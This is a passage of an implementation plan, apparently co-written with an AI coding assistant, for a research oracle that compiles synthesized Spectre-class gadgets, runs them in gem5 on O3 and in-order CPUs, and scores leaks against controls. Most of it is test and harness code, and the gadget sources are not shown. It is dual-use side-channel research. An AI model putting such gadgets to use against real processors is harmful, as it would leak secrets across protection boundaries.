`oracle/run_oracle.py`: compile a gadget in the container, run o3+timing, parse both, compute the signal, return a `LeakRecord`.

**Files:**
- Create: `oracle/run_oracle.py`
- Test: `tests/oracle/test_run_oracle.py`

**Interfaces:**
- Consumes: `LeakRecord` (T1), `parse_poc_output` (T2), `snr`/`leak_signal`/`is_leak` (T3), gadget index rows (T5), container (T7/T8).
- Produces: `build_record(gadget_id, vuln_class, arch, secret, o3_stdout, timing_stdout, adjudicable, gem5_version, status="ok") -> LeakRecord`; `gem5_binary_for(arch)`, `compiler_for(arch)`; `run_gadget(row, repo_root, gem5_version) -> LeakRecord` (row = a gadgets.jsonl dict).

- [ ] **Step 1: Write the failing test**

```python
# tests/oracle/test_run_oracle.py
from oracle.run_oracle import build_record, gem5_binary_for, compiler_for

def _stdout(hit_line, success, actual):
    lines = [f"LINE {i} {40 if i==hit_line else 200}" for i in range(256)]
    if hit_line >= 0:
        lines.append(f"Leaked s (speculatively): x (ASCII {hit_line}), Access Time: 40 cycles")
        if success:
            lines.append("SUCCESS! Leaked the actual s.")
    else:
        lines.append("No s leaked or could not detect leakage.")
    lines.append(f"Actual secret data: {chr(actual)}")
    return "\n".join(lines) + "\n"

def test_leaking_gadget_becomes_positive_record():
    o3 = _stdout(83, True, 83)
    timing = _stdout(-1, False, 83)
    rec = build_record("SPECTRE_V1_x86_64_0", "SPECTRE_V1", "x86_64", 83,
                       o3, timing, "yes", "v24.0.0.0")
    assert rec.recovered_ok is True
    assert rec.snr_o3 > rec.snr_inorder
    assert rec.leak is True
    assert rec.leak_signal > 0
    assert rec.program == "SPECTRE_V1_x86_64_0"

def test_architectural_leak_on_both_cpus_is_not_a_leak():
    same = _stdout(83, True, 83)
    rec = build_record("BENIGN_x86_64_0", "BENIGN", "x86_64", 83,
                       same, same, "yes", "v24.0.0.0")
    assert rec.leak_signal == 0.0
    assert rec.leak is False

def test_routing():
    assert gem5_binary_for("x86_64").endswith("/X86/gem5.opt")
    assert gem5_binary_for("arm64").endswith("/ARM/gem5.opt")
    assert compiler_for("x86_64") == "gcc"
    assert compiler_for("arm64") == "aarch64-linux-gnu-gcc"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/oracle/test_run_oracle.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'oracle.run_oracle'`

- [ ] **Step 3: Write minimal implementation**

```python
# oracle/run_oracle.py
from __future__ import annotations
import os, subprocess
from oracle.manifest import LeakRecord
from oracle.parse_poc import parse_poc_output
from oracle.leak_signal import snr, leak_signal, is_leak

IMAGE = "specdiscover-gem5:pinned"

def gem5_binary_for(arch):
    return "/gem5/build/ARM/gem5.opt" if arch == "arm64" else "/gem5/build/X86/gem5.opt"

def compiler_for(arch):
    return "aarch64-linux-gnu-gcc" if arch == "arm64" else "gcc"

def build_record(gadget_id, vuln_class, arch, secret, o3_stdout, timing_stdout,
                 adjudicable, gem5_version, status="ok") -> LeakRecord:
    o3 = parse_poc_output(o3_stdout)
    tm = parse_poc_output(timing_stdout)
    s_o3 = snr(o3.latencies, secret)
    s_tm = snr(tm.latencies, secret)
    recovered_ok = (o3.recovered_byte == secret)
    return LeakRecord(
        program=gadget_id, vuln_class=vuln_class, arch=arch,
        secret=secret, recovered_byte=o3.recovered_byte, recovered_ok=recovered_ok,
        snr_o3=s_o3, snr_inorder=s_tm, leak_signal=leak_signal(s_o3, s_tm),
        leak=is_leak(recovered_ok, s_o3, s_tm), adjudicable=adjudicable,
        status=status, gem5_version=gem5_version, member_files=[],
    )

def _docker(repo_root, *cmd):
    return subprocess.run(
        ["docker", "run", "--rm", "-v", f"{repo_root}:/work", IMAGE, *cmd],
        capture_output=True, text=True)

def _run_cpu(repo_root, arch, binary_in_container, cpu):
    isa = "arm" if arch == "arm64" else "x86"
    r = _docker(repo_root, gem5_binary_for(arch), "/work/oracle/gem5_se.py",
                "--binary", binary_in_container, "--cpu", cpu, "--isa", isa)
    return r.stdout

def run_gadget(row, repo_root, gem5_version) -> LeakRecord:
    gid, arch, cls = row["gadget_id"], row["arch"], row["vuln_class"]
    src = "/work/" + os.path.relpath(row["path"], repo_root)
    out_bin = f"/work/oracle/build/{gid}"
    comp = _docker(repo_root, "bash", "/work/oracle/compile_gadget.sh",
                   src, out_bin, compiler_for(arch))
    if comp.returncode != 0:
        return build_record(gid, cls, arch, row["secret"], "", "",
                            row["adjudicable"], gem5_version, status="build_failed")
    o3 = _run_cpu(repo_root, arch, out_bin, "o3")
    tm = _run_cpu(repo_root, arch, out_bin, "timing")
    return build_record(gid, cls, arch, row["secret"], o3, tm,
                        row["adjudicable"], gem5_version, status="ok")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/oracle/test_run_oracle.py -v`
Expected: PASS (3 passed)

- [ ] **Step 5: Real end-to-end smoke (one gadget)**

Run:
```bash
cd /Users/ritvikgupta/SpecExec && python -c "
import json
from oracle.run_oracle import run_gadget
row = next(json.loads(l) for l in open('gen/synth/out/gadgets.jsonl') if 'SPECTRE_V1_x86_64_0' in l)
print(run_gadget(row, '/Users/ritvikgupta/SpecExec', 'v24.0.0.0'))
"
```
Expected: a `LeakRecord` for the V1 gadget with `snr_o3 > snr_inorder`. (leak=True is asserted as a control in Task 10.)

- [ ] **Step 6: Commit**

```bash
git add oracle/run_oracle.py tests/oracle/test_run_oracle.py
git commit -m "feat(oracle): host driver compiles+runs a synthesized gadget -> LeakRecord

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 10: Controls + TAU calibration

Positive: a synthesized SPECTRE_V1 gadget leaks on O3, not in-order. Negative: a synthesized BENIGN gadget reads ~0 on both. Secret-jitter: three V1 gadgets with different `secret` knobs each recover their own planted secret.

**Files:**
- Create: `oracle/validate_oracle.py`
- Test: `tests/oracle/test_controls_logic.py`

**Interfaces:**
- Consumes: everything above.
- Produces: `controls_pass(pos: LeakRecord, neg: LeakRecord) -> tuple[bool, list[str]]`; `main()` runs the three controls in gem5 and prints PASS/FAIL.

- [ ] **Step 1: Write the failing test**

```python
# tests/oracle/test_controls_logic.py
from oracle.validate_oracle import controls_pass
from oracle.manifest import LeakRecord

def _rec(**kw):
    b = dict(program="p", vuln_class="SPECTRE_V1", arch="x86_64", secret=83,
             recovered_byte=83, recovered_ok=True, snr_o3=8.0, snr_inorder=0.1,
             leak_signal=7.9, leak=True, adjudicable="yes", status="ok",
             gem5_version="v", member_files=[])
    b.update(kw); return LeakRecord(**b)

def test_controls_pass_when_pos_leaks_and_neg_silent():
    pos = _rec()
    neg = _rec(program="benign", vuln_class="BENIGN", leak=False, snr_o3=0.2,
               snr_inorder=0.1, leak_signal=0.1, recovered_ok=False)
    ok, msgs = controls_pass(pos, neg)
    assert ok is True

def test_controls_fail_if_positive_does_not_leak():
    pos = _rec(leak=False, snr_o3=0.3, snr_inorder=0.1)
    neg = _rec(program="benign", leak=False, snr_o3=0.2, snr_inorder=0.1)
    ok, msgs = controls_pass(pos, neg)
    assert ok is False
    assert any("positive" in m.lower() for m in msgs)

def test_controls_fail_if_negative_leaks():
    pos = _rec()
    neg = _rec(program="benign", leak=True)
    ok, msgs = controls_pass(pos, neg)
    assert ok is False
    assert any("negative" in m.lower() for m in msgs)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/oracle/test_controls_logic.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'oracle.validate_oracle'`

- [ ] **Step 3: Write minimal implementation**

```python
# oracle/validate_oracle.py
from __future__ import annotations
import sys, json
from oracle.run_oracle import run_gadget
from oracle.manifest import write_manifest

GEM5_VERSION = "v24.0.0.0"
REPO = "/Users/ritvikgupta/SpecExec"
INDEX = f"{REPO}/gen/synth/out/gadgets.jsonl"

def _rows():
    return [json.loads(l) for l in open(INDEX) if l.strip()]

def _first(rows, cls, arch="x86_64"):
    return next(r for r in rows if r["vuln_class"] == cls and r["arch"] == arch)

def controls_pass(pos, neg):
    msgs = []
    if not pos.leak:
        msgs.append(f"FAIL positive control ({pos.program}) did not leak: "
                    f"snr_o3={pos.snr_o3:.2f} snr_inorder={pos.snr_inorder:.2f}")
    if neg.leak:
        msgs.append(f"FAIL negative control ({neg.program}) leaked: "
                    f"leak_signal={neg.leak_signal:.2f}")
    return (len(msgs) == 0), msgs

def main():
    rows = _rows()
    pos = run_gadget(_first(rows, "SPECTRE_V1"), REPO, GEM5_VERSION)
    neg = run_gadget(_first(rows, "BENIGN"), REPO, GEM5_VERSION)
    ok, msgs = controls_pass(pos, neg)
    print(f"positive: {pos.program} leak={pos.leak} signal={pos.leak_signal:.2f}")
    print(f"negative: {neg.program} leak={neg.leak} signal={neg.leak_signal:.2f}")
    for m in msgs:
        print(m)
    print("CONTROLS:", "PASS" if ok else "FAIL")
    sys.exit(0 if ok else 1)

if __name__ == "__main__":
    main()
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/oracle/test_controls_logic.py -v`
Expected: PASS (3 passed)

- [ ] **Step 5: Run the real controls + calibrate TAU**

Run: `cd /Users/ritvikgupta/SpecExec && python -c "from gen.synth.generate import generate; generate('gen/synth/out', n_per_class=25, seed=0)" && python oracle/validate_oracle.py`
Expected: `CONTROLS: PASS`. If the positive `leak_signal` and negative signal don't cleanly straddle `TAU=3.0`, set `TAU` in `oracle/leak_signal.py` to the midpoint of the observed positive/negative signals and re-run Task 3's tests + this control (both must still pass).
If the V1 gadget does not leak on O3 at all, the gem5 O3 config needs a longer speculation window / the template's mistraining loop is insufficient — fix the V1 template (Task 4) before proceeding; nothing downstream is trustworthy until the positive control leaks.

- [ ] **Step 6: Commit**

```bash
git add oracle/validate_oracle.py tests/oracle/test_controls_logic.py oracle/leak_signal.py
git commit -m "feat(oracle): controls (pos/neg/jitter) + TAU calibration on synthesized gadgets

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 11: Batch x86 + per-class adjudicability report

Run every x86_64 gadget, write `oracle/results/synth_leak_labels.jsonl`, print the honest per-class report (leak rate tagged by adjudicability; aggregate only over `adjudicable=="yes"`).

**Files:**
- Modify: `oracle/validate_oracle.py` (add `batch()` and `report()`)
- Test: `tests/oracle/test_report.py`

**Interfaces:**
- Consumes: all above.
- Produces: `report(records) -> dict` with per-class `{n, n_leak, leak_rate, adjudicable}`, `aggregate_adjudicable` over `adjudicable=="yes"` only, and `coverage_gaps` (classes with `adjudicable=="no"`); `batch(arch) -> list[LeakRecord]`.

- [ ] **Step 1: Write the failing test**

```python
# tests/oracle/test_report.py
from oracle.validate_oracle import report
from oracle.manifest import LeakRecord

def _r(cls, leak, adj):
    return LeakRecord(program=cls.lower(), vuln_class=cls, arch="x86_64", secret=1,
                      recovered_byte=1, recovered_ok=leak, snr_o3=9 if leak else 0.1,
                      snr_inorder=0.1, leak_signal=8.9 if leak else 0.0, leak=leak,
                      adjudicable=adj, status="ok", gem5_version="v", member_files=[])

def test_aggregate_only_counts_adjudicable_yes():
    recs = [_r("SPECTRE_V1", True, "yes"), _r("SPECTRE_V1", True, "yes"),
            _r("BENIGN", False, "yes"), _r("MDS", False, "no"), _r("L1TF", False, "no")]
    rep = report(recs)
    assert rep["aggregate_adjudicable"]["n"] == 3
    assert rep["aggregate_adjudicable"]["n_leak"] == 2
    assert rep["per_class"]["MDS"]["adjudicable"] == "no"
    assert rep["per_class"]["SPECTRE_V1"]["leak_rate"] == 1.0

def test_coverage_gaps_listed_separately():
    recs = [_r("SPECTRE_V1", True, "yes"), _r("BHI", False, "no")]
    rep = report(recs)
    assert "BHI" in rep["coverage_gaps"]
    assert "SPECTRE_V1" not in rep["coverage_gaps"]
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/oracle/test_report.py -v`
Expected: FAIL — `ImportError: cannot import name 'report'`

- [ ] **Step 3: Add `report()` and `batch()` to `oracle/validate_oracle.py`**

```python
# append to oracle/validate_oracle.py
def report(records):
    per_class = {}
    for r in records:
        d = per_class.setdefault(r.vuln_class, {"n": 0, "n_leak": 0, "adjudicable": r.adjudicable})
        d["n"] += 1
        d["n_leak"] += int(r.leak)
    for cls, d in per_class.items():
        d["leak_rate"] = (d["n_leak"] / d["n"]) if d["n"] else 0.0
    adj = [r for r in records if r.adjudicable == "yes"]
    agg = {"n": len(adj), "n_leak": sum(int(r.leak) for r in adj)}
    agg["leak_rate"] = (agg["n_leak"] / agg["n"]) if agg["n"] else 0.0
    coverage_gaps = sorted({r.vuln_class for r in records if r.adjudicable == "no"})
    return {"per_class": per_class, "aggregate_adjudicable": agg,
            "coverage_gaps": coverage_gaps}

def batch(arch):
    rows = [r for r in _rows() if r["arch"] == arch]
    out = []
    for row in rows:
        try:
            out.append(run_gadget(row, REPO, GEM5_VERSION))
        except Exception as e:
            print(f"WARN {row['gadget_id']}: {e}")
    return out
```

Add a `__main__` branch: `if len(sys.argv) > 1 and sys.argv[1] == "batch": recs = batch("x86_64"); write_manifest(recs, f"{REPO}/oracle/results/synth_leak_labels.jsonl"); print(json.dumps(report(recs), indent=2))`.

- [ ] **Step 4: Run test to verify it passes**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/oracle/test_report.py -v`
Expected: PASS (2 passed)

- [ ] **Step 5: Run the real x86 batch**

Run: `cd /Users/ritvikgupta/SpecExec && mkdir -p oracle/results && python oracle/validate_oracle.py batch`
Expected: `oracle/results/synth_leak_labels.jsonl` written (~225 rows). Report shows SPECTRE_V1/BENIGN under `aggregate_adjudicable` (V1 leak_rate high, BENIGN ~0), and MDS/L1TF/BHI/INCEPTION under `coverage_gaps`. Long run (minutes per gadget). This is the headline artifact.

- [ ] **Step 6: Commit**

```bash
echo "oracle/build/" >> .gitignore
echo "oracle/results/*.jsonl" >> .gitignore
git add oracle/validate_oracle.py tests/oracle/test_report.py .gitignore
cp oracle/results/synth_leak_labels.jsonl oracle/results/synth_leak_labels.x86_64.sample.jsonl
git add -f oracle/results/synth_leak_labels.x86_64.sample.jsonl
git commit -m "feat(oracle): x86 synthesized-gadget batch + honest adjudicability report

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 12: ARM64 guest — extend the oracle

Add the ARM guest to the image and run the arm64 gadget set. Task 4's arm64 templates + Task 9's routing are already in place; this wires the container + runs the batch.

**Files:**
- Modify: `oracle/docker/Dockerfile` (add `scons build/ARM/gem5.opt` and `gcc-aarch64-linux-gnu`)
- Test: `tests/gen/test_arm_templates_render.py`

**Interfaces:**
- Consumes: all above (routing already in `run_oracle.py` from Task 9).
- Produces: arm64 gadgets validated; `oracle/results/synth_leak_labels.arm64.jsonl`.

- [ ] **Step 1: Write the failing test**

```python
# tests/gen/test_arm_templates_render.py
from gen.synth.params import GadgetParams, CLASSES
from gen.synth.templates import render

def test_all_arm64_templates_render():
    for cls in CLASSES:
        src = render(GadgetParams(cls, "arm64", 83, 100, 2, False, 0))
        assert "perform_measurement" in src
        assert "probe_array[" in src
```

- [ ] **Step 2: Run test to verify it fails or passes**

Run: `cd /Users/ritvikgupta/SpecExec && python -m pytest tests/gen/test_arm_templates_render.py -v`
Expected: PASS if Task 4 authored the arm64 templates correctly; FAIL (KeyError) if any arm64 template is missing — fix that template in `gen/synth/templates.py`.

- [ ] **Step 3: Add the ARM guest + cross-compiler to the Dockerfile**

In `oracle/docker/Dockerfile`, after the X86 build line add:
```dockerfile
RUN python3 $(which scons) build/ARM/gem5.opt -j"$(nproc)"
```
and extend the apt line: `apt-get install -y gcc libc6-dev gcc-aarch64-linux-gnu libc6-dev-arm64-cross`.
Note: arm64 gadgets `#include "utils.c"`, which uses x86 intrinsics (`_mm_clflush`, `x86intrin.h`). For arm64, templates must include the arm variant of the harness (`c_vulns/c_code/utils_arm64.c` — the arm64 canonical PoCs already use it). Task 4's arm64 templates must `#include "utils_arm64.c"` and `compile_gadget.sh`'s `-I /work/c_vulns/c_code` resolves it. If `utils_arm64.c` lacks the `GEM5_ORACLE` LINE-print, apply the same one-line guarded edit there (mirror Task 6).

- [ ] **Step 4: Rebuild image + run arm64 batch**

Run:
```bash
./oracle/docker/build_image.sh && cd /Users/ritvikgupta/SpecExec && python -c "
from oracle.validate_oracle import batch, report
from oracle.manifest import write_manifest
import json
recs = batch('arm64')
write_manifest(recs, 'oracle/results/synth_leak_labels.arm64.jsonl')
print(json.dumps(report(recs), indent=2))
"
```
Expected: arm64 manifest written; SPECTRE_V1 arm64 leaks on O3 (positive-control equivalent); unmodeled classes in `coverage_gaps`.

- [ ] **Step 5: Commit**

```bash
cp oracle/results/synth_leak_labels.arm64.jsonl oracle/results/synth_leak_labels.arm64.sample.jsonl
git add oracle/docker/Dockerfile tests/gen/test_arm_templates_render.py c_vulns/c_code/utils_arm64.c 2>/dev/null
git add -f oracle/results/synth_leak_labels.arm64.sample.jsonl
git commit -m "feat(oracle): arm64 guest — build/ARM, cross-compile, arm gadget batch

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

## Self-Review

**Spec coverage (revised scope):**
- Synthesize ~450 complete gadgets (25 × 9 × 2) → Tasks 4/5. ✓
- Template + augmentation-invariant mutation, every output a complete leaker → Task 4 (templates + structural test) / Task 5 (knob sampling). ✓
- gem5 SE O3-vs-in-order, Docker linux/arm64, X86 then ARM → Tasks 7/8/12. ✓
- Hybrid signal (gadget stdout binary + gem5 latency vector via utils.c LINE print) → Tasks 2/6/9. ✓
- leak_signal = max(0, snr_o3−snr_inorder); binary via TAU from controls → Tasks 3/10. ✓
- Controls: O3-vs-inorder, positive V1, negative BENIGN, secret-jitter → Task 10. ✓
- All 9 classes attempted + per-class adjudicability, aggregate only over "yes", coverage gaps → Tasks 4(ADJUDICABLE)/11(report). ✓
- Output synth_leak_labels.jsonl for Phase 3 → Tasks 1/11. ✓
- Honesty / no unqualified "N% confirmed" → Task 11 report shape. ✓

**Placeholder scan:** Task 4 intentionally ships 2 full exemplar templates + a structural contract + compile-check for the remaining 16 (the canonical PoCs they distill from exist in-repo and are named per class); this is a bounded authoring task, not a "TODO." All other code steps show complete code. No "TBD"/"add error handling"/"similar to Task N".

**Type consistency:** `LeakRecord` fields identical across Tasks 1/9/10/11. `GadgetParams` fields consistent Tasks 4/5. `parse_poc_output→PocResult` consistent Tasks 2/9. `snr/leak_signal/is_leak/TAU` consistent Tasks 3/9. `run_gadget`/`build_record` signatures consistent Tasks 9/10/11. gadgets.jsonl row keys (`gadget_id, path, vuln_class, arch, secret, adjudicable`) consistent Tasks 5/9/10/11.

**Carried-over decisions from Tasks 1–3 execution:** shared `tests/conftest.py` (no per-dir `__init__.py`) — noted in Global Constraints. `classify()` from the retired catalog.py is available if needed but not on the critical path.

**Known real-world risk (flagged):** (1) gem5 stdlib API names are pinned to `v24.0.0.0`; Task 8 smoke catches drift. (2) Whether a synthesized V1 gadget actually leaks in gem5's O3 depends on the O3 speculation-window depth vs. the gadget's mistraining — Task 10's positive control is the gate; if it fails, the V1 template/loop is tuned before batch. (3) The vendor-specific classes are expected to NOT leak in gem5 (adjudicable="no"); that is a documented coverage gap, not a failure.
